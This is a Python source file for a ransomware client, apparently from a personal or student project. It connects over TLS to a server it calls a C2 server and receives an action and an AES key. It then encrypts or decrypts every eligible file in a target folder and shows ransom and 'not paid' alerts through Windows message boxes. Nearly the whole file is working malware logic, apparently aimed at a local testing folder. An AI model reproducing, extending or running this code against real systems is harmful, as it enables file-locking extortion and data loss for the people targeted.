from __future__ import annotations

import ctypes
import socket
import ssl

from config.client_config import ClientConfig
from cipher_utils import decrypt_single_file, encrypt_single_file, process_files
from consts.client_consts import IGNORED_EXTENSIONS, IGNORED_FOLDERS
from protocol import recv_msg
from consts.shared_consts import AES_MODE, DECRYPT, ENCRYPT, MINIMUM_SSL_VERSION


class SecureClient:
    def __init__(self, config: ClientConfig) -> None:
        self._cfg = config
        self._context = self._create_tls_context()

    def _create_tls_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        ctx.load_verify_locations(cafile=self._cfg.cafile)
        ctx.check_hostname = self._cfg.check_hostname
        ctx.minimum_version = MINIMUM_SSL_VERSION
        return ctx

    def execute_ransomware_flow(self, target_folder: str) -> bool:
        print("Connecting to C2 Server...")
        with socket.create_connection((self._cfg.host, self._cfg.port)) as sock:
            with self._context.wrap_socket(sock, server_hostname=self._cfg.hostname) as tls_conn:
                print(" Secure connection established. Waiting for instructions...")
                
                action = recv_msg(tls_conn)
                aes_key = recv_msg(tls_conn)
                
                if not action or not aes_key:
                    print("Failed to receive data from server.")
                    return False
                
                
                if action == ENCRYPT:
                    process_files(folder_path=target_folder,
                                  process_function=encrypt_single_file, 
                                  process_arguments=[aes_key, AES_MODE],
                                  action=action,
                                  ignored_folders=IGNORED_FOLDERS,
                                  ignored_extensions=IGNORED_EXTENSIONS
                                  )

                    print("\n" + "!"*50)
                    print("!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!")
                    print("Your documents, photos, and databases are locked.")
                    print("!"*50 + "\n")
                    ctypes.windll.user32.MessageBoxW(0, "All files have been encrypted. Please check the text file called ransomware.txt.", "System Alert", 0)
                elif action == DECRYPT:
                    print(" Starting DECRYPTION process...")
                    process_files(folder_path=target_folder,
                                  process_function=decrypt_single_file, 
                                  process_arguments=[aes_key, AES_MODE],
                                  action=action,
                                  ignored_folders=IGNORED_FOLDERS,
                                  )
                    
                    ctypes.windll.user32.MessageBoxW(0, "All your files have been decrypted!", "System Alert", 0)
                elif action == b"NOT_PAID":
                    print("\n" + "="*40)
                    print("ERROR: Ransom has not been paid yet!")
                    print("Please transfer the payment to receive the key.")
                    print("="*40 + "\n")
                    ctypes.windll.user32.MessageBoxW(0, "You didn't pay the money!", "System Alert", 0)
                
                return True

def main() -> None:
    target_folder = r"C:\Users\97250\projects\Ransomware-Project\testing"
        
    print(" Connecting to Server...")
    config = ClientConfig() 
    client = SecureClient(config)
    client.execute_ransomware_flow(target_folder)
    print("\n Program finished.")
    
if __name__ == "__main__":
    main()